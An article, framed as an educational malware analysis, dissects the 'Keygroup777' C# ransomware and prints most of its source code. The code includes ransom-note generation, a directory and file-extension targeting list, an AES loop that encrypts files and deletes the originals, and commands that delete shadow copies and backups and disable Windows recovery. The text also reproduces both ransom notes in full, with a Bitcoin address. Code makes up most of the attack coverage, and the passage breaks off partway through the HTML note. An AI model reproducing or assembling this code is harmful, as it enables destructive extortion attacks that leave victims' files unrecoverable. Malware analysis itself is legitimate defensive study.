# 🔍 Analyzing a Ransomware Code: A Deep Dive into Malicious Behavior 🕵️‍♂️

Ransomware is a malicious type of software designed to encrypt a victim's files and demand payment for their decryption. The provided C# code, named "Keygroup777," is a ransomware sample that demonstrates harmful behaviors such as file encryption, ransom note creation, and system recovery manipulation. In this article, we will dissect the code, explain its functionality, and highlight its malicious intent, illustrating each point with complete code snippets. Additionally, we will include a dedicated section analyzing the two ransom notes (`info.txt` and `info.html`). The goal is to understand how such malware operates while emphasizing the importance of cybersecurity.

> **Disclaimer**: This analysis is for educational purposes only. Running or distributing malicious code is illegal and unethical. Always handle such code in a controlled, isolated environment.

---

## 🖥️ Overview of the Ransomware

The Keygroup777 ransomware, written in C#, targets Windows systems and performs the following actions:
1. Creates two ransom notes: a text file (`info.txt`) and an HTML page (`info.html`) on the victim's desktop.
2. Encrypts files in multiple directories using AES encryption.
3. Deletes original files and renames encrypted files with a `.Keygroup777` extension.
4. Disables system recovery mechanisms to prevent file restoration.
5. Demands a Bitcoin payment for decryption.

Let’s break down each component with the corresponding code.

---

## 📝 1. Creating the Ransom Notes

The ransomware creates two ransom notes on the victim's desktop: `info.txt` and `info.html`. These files inform the victim that their files are encrypted and provide instructions for paying the ransom.

### Code for `info.txt`
```csharp
string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
string contents = "You became victim of the keygroup777 RANSOMWARE!\r\nThe files on your computer have been encrypted with an military grade encryption algorithm. There is no way to\r\nrestore your data without a special key. You can purchase this key on the telegram page shown in step 2.\r\nTo purchase your key and restore your data, please follow these three easy steps:\r\nregister a bitcoin 300$ @keygroup777Rezerv1 3MVvvtDHaMTEgMUVnTLoL3k36iFTcow9jj.\r\n2. register a bitcoin wallet :\r\nhttps://bitcoin-wallet.org/ru/\r\nhttps://bitcoin-wallet.org/ru/\r\n3. Enter your personal decryption code there:\r\ne5Pc4P8WjF35";
File.WriteAllText(Path.Combine(folderPath, "info.txt"), contents);
```

### Explanation
- **Path Retrieval**: The desktop path is obtained using `Environment.GetFolderPath(Environment.SpecialFolder.Desktop)`.
- **Ransom Message**: The `contents` string claims the files are encrypted with a "military-grade" algorithm and demands a $300 Bitcoin payment to the address `3MVvvtDHaMTEgMUVnTLoL3k36iFTcow9jj`.
- **Instructions**: It instructs the victim to contact `@keygroup777Rezerv1` on Telegram, register a Bitcoin wallet, and use a decryption code (`e5Pc4P8WjF35`).
- **File Creation**: The message is saved as `info.txt` on the desktop using `File.WriteAllText`.

### Code for `info.html`
```csharp
string contents2 = "<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<title>Keygroup Decryptor 2.0</title>\r\n<style>\r\nbody {\r\n  background-color: #c00;\r\n  color: #fff;\r\n  font-family: sans-serif;\r\n}\r\n\r\n.container {\r\n  display: flex;\r\n  justify-content: center;\r\n  align-items: center;\r\n  height: 100vh;\r\n}\r\n\r\n.card {\r\n  background-color: #f00;\r\n  padding: 20px;\r\n  border-radius: 5px;\r\n  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);\r\n  width: 600px;\r\n}\r\n\r\nh1 {\r\n  text-align: center;\r\n  margin-bottom: 20px;\r\n}\r\n\r\n.countdown {\r\n  background-color: #fff;\r\n  color: #000;\r\n  font-size: 24px;\r\n  padding: 10px;\r\n  border-radius: 5px;\r\n  margin-bottom: 20px;\r\n  text-align: center;\r\n}\r\n\r\n.button {\r\n  background-color: #000;\r\n  color: #fff;\r\n  padding: 10px 20px;\r\n  border: none;\r\n  border-radius: 5px;\r\n  cursor: pointer;\r\n  font-size: 16px;\r\n  margin-right: 10px;\r\n}\r\n\r\n.button:hover {\r\n  opacity: 0.8;\r\n}\r\n\r\n.bitcoin-address {\r\n  background-color: #fff;\r\n  color: #000;\r\n  font-size: 16px;\r\n  padding: 10px;\r\n  border-radius: 5px;\r\n  margin-bottom: 20px;\r\n}\r\n\r\n.bitcoin-logo {\r\n  width: 50px;\r\n  height: 50px;\r\n  margin-right: 10px;\r\n}\r\n</style>\r\n</head>\r\n<body>\r\n<div class=\"container\">\r\n  <div class=\"card\">\r\n    <h1 id=\"title\">Oops, your files have been encrypted!</h1>\r\n    <h2 id=\"whatHappened\">Что случилось с моим компьютером?</h2>\r\n    <p id=\"filesEncrypted\">Ваши важные файлы зашифрованы.</p>\r\n    <p id=\"details\">Многие из ваших документов, фотографий, видео, баз данных и других файлов больше недоступны...</p>\r\n    <h2 id=\"recoverFiles\">Можно ли восстановить файлы?</h2>\r\n    <p id=\"guarantee\">Конечно. Мы гарантируем, что вы сможете безопасно и легко восстановить все свои файлы. Но у вас не так много времени.</p>\r\n    <p id=\"freeDecrypt\">Вы можете расшифровать некоторые свои файлы бесплатно. Попробуйте нажать \"<span style=\"color:blue;\">Decrypt</span>\".</p>\r\n    <p id=\"paymentNeed\">Но если вы хотите расшифровать все свои файлы, вам нужно заплатить.</p>\r\n    <p id=\"timeLimit\">У вас есть только 3 дня, чтобы отправить платеж...</p>\r\n    <h2 id=\"howToPay\">Как мне оплатить?</h2>\r\n    <p id=\"paymentMethod\">Оплата принимается только в биткоинах...</p>\r\n    <div class=\"bitcoin-address\" id=\"bitcoinAddress\">\r\n      3MVvvtDHaMTEgMUVnTLoL3k36iFTcow9jj\r\n    </div>\r\n    <button class=\"button\" onclick=\"copyAddress()\">Copy</button>\r\n    <div class=\"countdown\" id=\"timer\">\r\n      Time Left: <span id=\"countdown\">02:23:00</span>\r\n    </div>\r\n    <button class=\"button\" onclick=\"window.location.href='https://ru.wikipedia.org/wiki/Биткойн'\">About bitcoin</button>\r\n    <button class=\"button\" onclick=\"window.location.href='https://ababa1ds.github.io/keygroup777/'\">Decrypt</button>\r\n    \r\n    <div>\r\n      <button class=\"button\" onclick=\"changeLanguage('ru')\">Русский</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('be')\">Беларуский</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('zh')\">中文</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('es')\">Español</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('ku')\">Kreyòl Ayisyen</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('my')\">မ\u103cန\u103aမ\u102c</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('sy')\">سورية</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('er')\">ኢርትራ</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('ni')\">Nicaragua</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('ve')\">Venezuela</button>\r\n    </div>\r\n  </div>\r\n</div>\r\n\r\n<script>\r\nfunction copyAddress() {\r\n  var copyText = document.querySelector('.bitcoin-address').textContent;\r\n  navigator.clipboard.writeText(copyText)\r\n    .then(() => {\r\n      alert(\"Адрес скопирован в буфер обмена!\");\r\n    })\r\n    .catch(err => {\r\n      console.error(\"Failed to copy: \", err);\r\n    });\r\n}\r\n\r\nlet countdownTime = 10800; // 3 часа в секундах\r\nconst countdownElement = document.getElementById('countdown');\r\n\r\nfunction startTimer() {\r\n  const interval = setInterval(() => {\r\n    if (countdownTime <= 0) {\r\n      clearInterval(interval);\r\n      countdownElement.textContent = \"Время истекло!\";\r\n      return;\r\n    }\r\n    countdownTime--;\r\n    const hours = String(Math.floor(countdownTime / 3600)).padStart(2, '0');\r\n\r\n    const minutes = String(Math.floor((countdownTime % 3600) / 60)).padStart(2, '0');\r\n    const seconds = String(countdownTime % 60).padStart(2, '0');\r\n    countdownElement.textContent = `${hours}:${minutes}:${seconds}`;\r\n  }, 1000);\r\n}\r\n\r\nstartTimer();\r\n\r\nfunction changeLanguage(lang) {\r\n  const texts = {\r\n    ru: {\r\n      title: \"Упс, ваши файлы были зашифрованы!\",\r\n      whatHappened: \"Что случилось с моим компьютером?\",\r\n      filesEncrypted: \"Ваши важные файлы зашифрованы.\",\r\n      details: \"Многие из ваших документов, фотографий, видео, баз данных и других файлов больше недоступны...\",\r\n      recoverFiles: \"Можно ли восстановить файлы?\",\r\n      guarantee: \"Конечно. Мы гарантируем, что вы сможете безопасно и легко восстановить все свои файлы. Но у вас не так много времени.\",\r\n      freeDecrypt: \"Вы можете расшифровать некоторые свои файлы бесплатно. Попробуйте нажать 'Decrypt'.\",\r\n      paymentNeed: \"Но если вы хотите расшифровать все свои файлы, вам нужно заплатить.\",\r\n      timeLimit: \"У вас есть только 3 дня, чтобы отправить платеж...\",\r\n      howToPay: \"Как мне оплатить?\",\r\n      paymentMethod: \"Оплата принимается только в биткоинах...\",\r\n    },\r\n    be: {\r\n      title: \"Ой, вашы файлы зашыфраваны!\",\r\n      whatHappened: \"Што здарылася з маім камп'ютэрам?\",\r\n      filesEncrypted: \"Вашы важныя файлы зашыфраваны.\",\r\n      details: \"Многія з вашых дакументаў, фотаздымкаў, відэа, баз даных і іншых файлаў больш недаступныя...\",\r\n      recoverFiles: \"Ці магу я аднавіць файлы?\",\r\n      guarantee: \"Канешне. Мы гарантуем, что вы зможаце бяспечна і лёгка аднавіць усе свае файлы. Але ў вас не так шмат часу.\",\r\n      freeDecrypt: \"Вы можаце расшыфраваць некаторыя з сваіх файлаў бясплатна. Спробуйце націснуць 'Decrypt'.\",\r\n      paymentNeed: \"Але калі вы хочаце расшыфраваць усе свае файлы, вам трэба заплаціць.\",\r\n      timeLimit: \"У вас ёсць толькі 3 дні, каб даслаць плацеж...\",\r\n      howToPay: \"Як мне заплаціць?\",\r\n      paymentMethod: \"Аплата прымаецца толькі ў біткойнах...\",\r\n    },\r\n    zh: {\r\n      title: \"哎呀，您的文件已经被加密！\",\r\n      whatHappened: \"我的电脑发生了什么？\",\r\n      filesEncrypted: \"您的重要文件已被加密。\",\r\n      details: \"您的许多文档、照片、视频、数据库和其他文件都无法访问......\",\r\n      recoverFiles: \"我可以恢复文件吗？\",\r\n      guarantee: \"当然。我们保证您可以安全轻松地恢复所有文件。但是，您没有多少时间。\",\r\n      freeDecrypt: \"您可以免费解密某些文件。尝试点击“Decrypt”。\",\r\n      paymentNeed: \"但如果您想解密所有文件，您需要支付。\",\r\n      timeLimit: \"您只有3天的时间进行付款......\",\r\n      howToPay: \"我该如何支付？\",\r\n      paymentMethod: \"仅接受比特币付款......\",\r\n    },\r\n    es: {\r\n      title: \"¡Oops, sus archivos han sido cifrados!\",\r\n      whatHappened: \"¿Qué ocurrió con mi computadora?\",\r\n      filesEncrypted: \"Sus archivos importantes están cifrados.\",\r\n      details: \"Muchos de sus documentos, fotos, videos, bases de datos y otros archivos ya no están disponibles...\",\r\n      recoverFiles: \"¿Se pueden recuperar los archivos?\",\r\n      guarantee: \"Por supuesto. Garantizamos que podrá recuperar todos sus archivos de forma segura y fácil. Pero no tiene mucho tiempo.\",\r\n      freeDecrypt: \"Puede descifrar algunos de sus archivos de forma gratuita. Intente presionar 'Decrypt'.\",\r\n      paymentNeed: \"Pero si desea descifrar todos sus archivos, necesitará pagar.\",\r\n      timeLimit: \"Solo tiene 3 días para enviar el pago...\",\r\n      howToPay: \"¿Cómo puedo pagar?\",\r\n      paymentMethod: \"El pago se acepta solo en bitcoins...\",\r\n    },\r\n    ku: {\r\n      title: \"Baxî, pelan we hatine şifrkirin!\",\r\n      whatHappened: \"Çi bûye bi kompiyutera min?\",\r\n      filesEncrypted: \"Pelên girîng yên we şifrkiriyane.\",\r\n      details: \"Ziyaretiyên belgeyên we, wêne, vîdyo, danegehan û pelên din ne qedîne... \",\r\n      recoverFiles: \"Ma dikarin pelan bigrin?\",\r\n      guarantee: \"Bila. Em piştrast dikin ku hûn dikarin hemû pelên xwe bi ewle û hêsan bigirin. Lê tu pir zor ne bidê.\",\r\n      freeDecrypt: \"Hûn dikarin hinek pelên xwe bi belaş şifre çözüne. Tiştek poçik bikin 'Decrypt'.\",\r\n      paymentNeed: \"Lê ger hûn dixwazin hemû pelên xwe şifre çözün, hûn pêdivî ye ku bişînin.\",\r\n      timeLimit: \"Hûn tenê 3 rojan hene da ku bîmre!\",\r\n      howToPay: \"Çawa ez para bidim?\",\r\n      paymentMethod: \"Tenê bi bitcoin tê qebûl kirin...\",\r\n    },\r\n\r\n    my: {\r\n      title: \"Oops, fail anda telah dienkripsi!\",\r\n      whatHappened: \"Apa yang berlaku kepada komputer saya?\",\r\n      filesEncrypted: \"Fail penting anda telah dienkripsi.\",\r\n      details: \"Banyak dokumen, foto, video, pangkalan data, dan fail lain anda tidak lagi boleh diakses...\",\r\n      recoverFiles: \"Bolehkah saya memulihkan fail?\",\r\n      guarantee: \"Sudah tentu. Kami menjamin bahawa anda dapat memulihkan semua fail anda dengan selamat dan mudah. Tetapi anda tidak mempunyai banyak masa.\",\r\n      freeDecrypt: \"Anda boleh menyahkripsi beberapa fail anda secara percuma. Cuba klik 'Decrypt'.\",\r\n      paymentNeed: \"Tetapi jika anda mahu menyahkripsi semua fail anda, anda perlu membayar.\",\r\n      timeLimit: \"Anda hanya mempunyai 3 hari untuk menghantar bayaran...\",\r\n      howToPay: \"Bagaimana saya perlu membayar?\",\r\n      paymentMethod: \"Pembayaran hanya diterima dalam bitcoin...\",\r\n    },\r\n    sy: {\r\n      title: \"أوبس، لقد تم تشفير ملفاتك!\",\r\n      whatHappened: \"ماذا حدث لجهاز الكمبيوتر الخاص بي؟\",\r\n      filesEncrypted: \"تم تشفير ملفاتك المهمة.\",\r\n      details: \"العديد من مستنداتك وصورك ومقاطع الفيديو وقواعد البيانات والملفات الأخرى لم تعد متاحة...\",\r\n      recoverFiles: \"هل يمكنني استعادة الملفات؟\",\r\n      guarantee: \"بالطبع. نحن نضمن أنك ستتمكن من استعادة جميع ملفاتك بأمان وسهولة. لكن ليس لديك الكثير من الوقت.\",\r\n      freeDecrypt: \"يمكنك فك تشفير بعض ملفاتك مجان\u064bا. حاول الضغط على 'Decrypt'.\",\r\n      paymentNeed: \"لكن إذا كنت تريد فك تشفير جميع ملفاتك، فسيتعين عليك الدفع.\",\r\n      timeLimit: \"لديك 3 أيام فقط لإرسال الدفع...\",\r\n      howToPay: \"كيف أدفع؟\",\r\n      paymentMethod: \"يتم قبول الدفع فقط بالبيتكوين...\",\r\n    },\r\n    er: {\r\n      title: \"እየአዛንክይ ኣመይር፣ ፋይልዎች ቀውም\",\r\n      whatHappened: \"እዚ ፀሐፍ ዲስኑ ወኣእጣጋክየ\",\r\n      filesEncrypted: \"ጊዜሉን ትኽዕልነ ወፋይሎች ተራቢኢ ይዌዐሉ\",\r\n      details: \"ዝይኮይ፡ በይ ዝኽይምየት ገምኒ፣ ሣንሕተን፣ ዳቦት ደቃይየ ሻትዉ>\",\r\n      recoverFiles: \"እንኩየዚ ዊኩር ይዋስዉ ኖల\u0c4bል?\",\r\n      guarantee: \"ወኣሰኴነ ዚ አረየዌ ምባምኩ ያለን ዘሓምሶ:\",\r\n      freeDecrypt: \"ጉዚዘ ኣዘንጭቱዋ ባቀዋክ ዋህዌውነ ይዋስዉ ው 'ምትተክ' ኒ\",\r\n      paymentNeed: \"ጠንኒዚ ከዜናዊ ተድጉብዢ \",\r\n      timeLimit: \"ጵዒ መድእም ከዕዟቀነ ናት ዉላ\",\r\n      howToPay: \"ዝይምቱሃን አውበጥ\",\r\n      paymentMethod: \"ንግዕቲቕ ኈንግሪይዊ ይፅይሉ እይሳነ\",\r\n    },\r\n    ni: {\r\n      title: \"Oops, ¡sus archivos han sido cifrados!\",\r\n      whatHappened: \"¿Qué pasó con mi computadora?\",\r\n      filesEncrypted: \"Sus archivos importantes han sido cifrados.\",\r\n      details: \"Muchos de sus documentos, fotos, videos, bases de datos y otros archivos ya no están disponibles...\",\r\n      recoverFiles: \"¿Puedo recuperar los archivos?\",\r\n      guarantee: \"Por supuesto. Garantizamos que podrá restaurar todos sus archivos de forma segura y fácil. Pero no tiene mucho tiempo.\",\r\n      freeDecrypt: \"Puede descifrar algunos de sus archivos de forma gratuita. Intente presionar 'Decrypt'.\",\r\n      paymentNeed: \"Pero si desea descifrar todos sus archivos, deberá pagar.\",\r\n      timeLimit: \"Solo tiene 3 días para enviar el pago...\",\r\n      howToPay: \"¿Cómo debo pagar?\",\r\n      paymentMethod: \"El pago solo se acepta en bitcoin...\",\r\n    },\r\n    ve: {\r\n      title: \"¡Oops, sus archivos han sido cifrados!\",\r\n      whatHappened: \"¿Qué pasó con mi computadora?\",\r\n      filesEncrypted: \"Sus archivos importantes están cifrados.\",\r\n      details: \"Muchos de sus documentos, fotos, videos, bases de datos y otros archivos ya no están disponibles...\",\r\n      recoverFiles: \"¿Se pueden recuperar los archivos?\",\r\n      guarantee: \"Por supuesto. Garantizamos que podrá recuperar todos sus archivos de forma segura y fácil. Pero no tiene mucho tiempo.\",\r\n      freeDecrypt: \"Puede descifrar algunos de sus archivos gratis. Intente presionar 'Decrypt'.\",\r\n      paymentNeed: \"Pero si desea descifrar todos sus archivos, necesitará pagar.\",\r\n      timeLimit: \"Solo tiene 3 días para enviar el pago...\",\r\n      howToPay: \"¿Cómo puedo pagar?\",\r\n      paymentMethod: \"El pago se acepta solo en bitcoins...\",\r\n    }\r\n  };\r\n\r\n  const selectedTexts = texts[lang];\r\n  for (const key in selectedTexts) {\r\n    document.getElementById(key).textContent = selectedTexts[key];\r\n  }\r\n}\r\n</script>\r\n</body>\r\n</html>\r\n";
File.WriteAllText(Path.Combine(folderPath, "info.html"), contents2);
```

### Explanation
- **HTML Structure**: The `info.html` file is a styled webpage with a red background, a countdown timer, and buttons for interaction.
- **Multilingual Support**: It supports multiple languages (e.g., Russian, Chinese, Spanish) via a JavaScript `changeLanguage` function, making it accessible globally.
- **Countdown Timer**: The `startTimer` function displays a 3-hour countdown to create urgency.
- **Bitcoin Address**: The address `3MVvvtDHaMTEgMUVnTLoL3k36iFTcow9jj` is displayed with a "Copy" button for easy clipboard access.

---

## 🔒 2. File Encryption with AES

The ransomware encrypts files in multiple directories using the AES algorithm.

### Code for File Encryption
```csharp
string[] array = new string[11]
{
    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
    Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\OneDrive",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\3D Objects",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Links",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Saved Games",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Searches",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Favorites",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Contacts",
    Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
};
string[] source = new string[240]
{
    ".myd", ".ndf", ".qry", ".sdb", ".sdf", ".tmd", ".tgz", ".lzo", ".txt", ".jar",
    ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
    ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql", ".indd", ".cs",
    ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi",
    ".apk", ".lnk", ".dib", ".dic", ".dif", ".mdb", ".php", ".asp", ".aspx", ".html",
    ".htm", ".xml", ".psd", ".pdf", ".xla", ".cub", ".dae", ".divx", ".iso", ".7zip",
    ".pdb", ".ico", ".pas", ".db", ".wmv", ".swf", ".cer", ".bak", ".backup", ".accdb",
    ".bay", ".p7c", ".exif", ".vss", ".raw", ".m4a", ".wma", ".ace", ".arj", ".bz2",
    ".cab", ".gzip", ".lzh", ".tar", ".jpeg", ".xz", ".mpeg", ".torrent", ".mpg", ".core",
    ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb", ".crt", ".xlsm",
    ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps", ".docm", ".wav",
    ".3gp", ".gif", ".log", ".gz", ".config", ".vb", ".m1v", ".sln", ".pst", ".obj",
    ".xlam", ".djvu", ".inc", ".cvs", ".dbf", ".tbi", ".wpd", ".dot", ".dotx", ".webm",
    ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk", ".vdi", ".vmdk", ".onepkg", ".accde",
    ".jsp", ".json", ".xltx", ".vsdx", ".uxdc", ".udl", ".3ds", ".3fr", ".3g2", ".accda",
    ".accdc", ".accdw", ".adp", ".ai", ".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8",
    ".arw", ".ascx", ".asm", ".asmx", ".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr",
    ".pict", ".rgbe", ".dwt", ".f4v", ".exr", ".kwm", ".max", ".mda", ".mde", ".mdf",
    ".mdw", ".mht", ".mpv", ".msg", ".myi", ".nef", ".odc", ".geo", ".swift", ".odm",
    ".odp", ".oft", ".orf", ".pfx", ".p12", ".pl", ".pls", ".safe", ".tab", ".vbs",
    ".xlk", ".xlm", ".xlt", ".xltm", ".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb",
    ".tif", ".rss", ".key", ".vob", ".epsp", ".dc3", ".iff", ".opt", ".onetoc2", ".nrw",
    ".pptm", ".potx", ".potm", ".pot", ".xlw", ".xps", ".xsd", ".exe", ".xsl", ".kmz",
    ".accdr", ".stm", ".accdt", ".ppam", ".pps", ".ppsm", ".1cd", ".p7b", ".wdb", ".sqlite"
};
using Aes aes = Aes.Create();
aes.GenerateKey();
byte[] key = aes.Key;
string[] array2 = array;
foreach (string folder in array2)
{
    string[] array3 = (from f in source.SelectMany((string ext) => Directory.GetFiles(folder, "*" + ext, SearchOption.AllDirectories))
        where !f.EndsWith("info.txt") && !f.EndsWith("info.html")
        select f).ToArray();
    string[] array4 = array3;
    foreach (string text in array4)
    {
        using (FileStream fileStream = File.Open(text, FileMode.Open))
        {
            byte[] array5 = new byte[fileStream.Length];
            fileStream.Read(array5, 0, array5.Length);
            byte[] array6;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
                cryptoStream.Write(array5, 0, array5.Length);
                cryptoStream.Close();
                array6 = memoryStream.ToArray();
            }
            using FileStream fileStream2 = File.Create(text + ".Keygroup777");
            fileStream2.Write(array6, 0, array6.Length);
        }
        File.Delete(text);
    }
}
```

### Explanation
- **Target Directories**: Targets 11 directories, including Desktop and OneDrive.
- **File Extensions**: Encrypts files with 240 extensions (e.g., `.docx`, `.jpg`).
- **AES Encryption**: Generates a new AES key, encrypts files, and saves them with a `.Keygroup777` extension.
- **Original File Deletion**: Deletes original files, leaving only encrypted versions.
- **Key Issue**: The AES key is not stored or sent, suggesting incomplete decryption functionality.

---

## 🛠️ 3. Disabling System Recovery

The ransomware disables Windows recovery mechanisms to prevent file restoration.

### Code for Disabling Recovery
```csharp
Process.Start("cmd.exe", "/C vssadmin delete shadows /All /Quiet");
Process.Start("cmd.exe", "bcdedit /set {default} bootstatuspolicy ignoreallfailures");
Process.Start("cmd.exe", "bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
Process.Start("cmd.exe", "bcdedit /set {default} recoveryenabled no");
Process.Start("cmd.exe", "wbadmin delete catalog -quiet");
```

### Explanation
- Deletes shadow copies (`vssadmin delete shadows`).
- Disables boot status checks and recovery environment (`bcdedit`).
- Deletes backup catalogs (`wbadmin delete catalog`).
- These actions block file recovery, increasing ransom payment pressure.

---

## 💸 4. Ransom Payment Demand

The ransomware demands a $300 Bitcoin payment.

### Relevant Code
From `info.txt`:
```csharp
string contents = "...register a bitcoin 300$ @keygroup777Rezerv1 3MVvvtDHaMTEgMUVnTLoL3k36iFTcow9jj...";
```

From `info.html`:
```html
<div class="bitcoin-address" id="bitcoinAddress">
  3MVvvtDHaMTEgMUVnTLoL3k36iFTcow9jj
</div>
<button class="button" onclick="copyAddress()">Copy</button>
```

### Explanation
- Demands $300 to Bitcoin address `3MVvvtDHaMTEgMUVnTLoL3k36iFTcow9jj`.
- Provides Telegram contact (`@keygroup777Rezerv1`) and a decryption code (`e5Pc4P8WjF35`).
- The HTML page facilitates copying the Bitcoin address.

---

## 📜 5. Detailed Analysis of Ransom Notes

The ransom notes (`info.txt` and `info.html`) are critical components designed to intimidate victims and guide them toward payment. Below, we analyze their content, structure, and psychological tactics.

### `info.txt` Ransom Note

#### Full Content
```text
You became victim of the keygroup777 RANSOMWARE!
The files on your computer have been encrypted with an military grade encryption algorithm. There is no way to
restore your data without a special key. You can purchase this key on the telegram page shown in step 2.
To purchase your key and restore your data, please follow these three easy steps:
register a bitcoin 300$ @keygroup777Rezerv1 3MVvvtDHaMTEgMUVnTLoL3k36iFTcow9jj.
2. register a bitcoin wallet :
https://bitcoin-wallet.org/ru/
https://bitcoin-wallet.org/ru/
3. Enter your personal decryption code there:
e5Pc4P8WjF35
```

#### Analysis
- **Tone and Intimidation**: The note starts with a bold declaration ("You became victim of the keygroup777 RANSOMWARE!") to instill fear.
- **False Claims**: It claims a "military-grade encryption algorithm," exaggerating the encryption's strength to discourage attempts at decryption without payment.
- **Payment Instructions**: The note provides a Bitcoin address and Telegram handle, but the repeated URL (`https://bitcoin-wallet.org/ru/`) suggests a lack of sophistication or an error.
- **Decryption Code**: The code `e5Pc4P8WjF35` is mentioned, but its purpose is unclear since the ransomware lacks a decryption mechanism.
- **Simplicity**: The text file is straightforward, likely intended as a fallback if the HTML page fails to load.

### `info.html` Ransom Note

#### Full Content
```html
<!DOCTYPE html>
<html>
<head>
<title>Keygroup Decryptor 2.0</title>
<style>
body {
  background-color: #c00;
  color: #fff;
  font-family: sans-serif;
}

.container {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.card {
  background-color: #f00;
  padding: 20px;
  border-radius: 5px;
  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
  width: 600px;
}

h1 {
  text-align: center;
  margin-bottom: 20px;
}

.countdown {
  background-color: #fff;
  color: #000;
  font-size: 24px;
  padding: 10px;
  border-radius: 5px;
  margin-bottom: 20px;
  text-align: center;
}

.button {
  background-color: #000;
  color: #fff;
  padding: 10px 20px;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  font-size: 16px;
  margin-right: 10px;
}

.button:hover {
  opacity: 0.8;
}

.bitcoin-address {
  background-color: #fff;
  color: #000;
  font-size: 16px;
  padding: 10px;
  border-radius: 5px;
  margin-bottom: 20px;
}

.bitcoin-logo {
  width: 50px;
  height: 50px;
  margin-right: 10px;
}
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <h1 id="title">Oops, your files have been encrypted!</h1>
    <h2 id="whatHappened">Что случилось с моим компьютером?</h2>
    <p id="filesEncrypted">Ваши важные файлы зашифрованы.</p>
    <p id="details">Многие из ваших документов, фотографий, видео, баз данных и других файлов больше недоступны...</p>
    <h2 id="recoverFiles">Можно ли восстановить файлы?</h2>
    <p id="guarantee">Конечно. Мы гарантируем, что вы сможете безопасно и легко восстановить все свои файлы. Но у вас не так много времени.</p>
    <p id="freeDecrypt">Вы можете расшифровать некоторые свои файлы бесплатно. Попробуйте нажать "<span style="color:blue;">Decrypt</span>".</p>
    <p id="paymentNeed">Но если вы хотите расшифровать все свои файлы, вам нужно заплатить.</p>
    <p id="timeLimit">У вас есть только 3 дня, чтобы отправить платеж...</p>
    <h2 id="howToPay">Как мне оплатить?</h2>
    <p id="paymentMethod">Оплата принимается только в биткоинах...</p>
    <div class="bitcoin-address" id="bitcoinAddress">
      3MVvvtDHaMTEgMUVnTLoL3k36iFTcow9jj
    </div>
    <button class="button" onclick="copyAddress()">Copy</button>
    <div class="countdown" id="timer">
      Time Left: <span id="countdown">02:23:00</span>
    </div>
    <button class="button" onclick="window.location.href='https://ru.wikipedia.org/wiki/Биткойн'">About bitcoin</button>
    <button class="button" onclick="window.location.href='https://ababa1ds.github.io/keygroup777/'">Decrypt</button>
    
    <div>
      <button class="button" onclick="changeLanguage('ru')">Русский</button>
      <button class="button" onclick="changeLanguage('be')">Беларуский</button>
      <button class="button" onclick="changeLanguage('zh')">中文</button>
      <button class="button" onclick="changeLanguage('es')">Español</button>
      <button class="button" onclick="changeLanguage('ku')">Kreyòl Ayisyen</button>
      <button class="button" onclick="changeLanguage('my')">မြန်မာ</button>
      <button class="button" onclick="changeLanguage('sy')">سورية</button>
      <button class="button" onclick="changeLanguage('er')">ኢርትራ</button>
      <button class="button" onclick="changeLanguage('ni')">Nicaragua</button>
      <button class="button" onclick="changeLanguage('ve')">Venezuela</button>
    </div>
  </div>
</div>

<script>
function copyAddress() {
  var copyText = document.querySelector('.bitcoin-address').textContent;
  navigator.clipboard.writeText(copyText)
    .then(() => {
      alert("Адрес скопирован в буфер обмена!");
    })
    .catch(err => {
      console.error("Failed to copy: ", err);
    });
}

let countdownTime = 10800; // 3 часа в секундах
const countdownElement = document.getElementById('countdown');

function startTimer() {
  const interval = setInterval(() => {
    if (countdownTime <= 0) {
      clearInterval(interval);
      countdownElement.textContent = "Время истекло!";
      return;
    }
    countdownTime--;
    const hours = String(Math.floor(countdownTime / 3600)).padStart(2, '0');
    const minutes = String(Math.floor((countdownTime % 3600) / 60)).padStart(2, '0');
    const seconds = String(countdownTime % 60).padStart(2, '0');
    countdownElement.textContent = `${hours}:${minutes}:${seconds}`;
  }, 1000);
}

startTimer();

function changeLanguage(lang) {
  const texts = {
    ru: {
      title: "Упс, ваши файлы были зашифрованы!",
      whatHappened: "Что случилось с моим компьютером?",
      filesEncrypted: "Ваши важные файлы зашифрованы.",
      details: "Многие из ваших документов, фотографий, видео, баз данных и других файлов больше недоступны...",
      recoverFiles: "Можно ли восстановить файлы?",
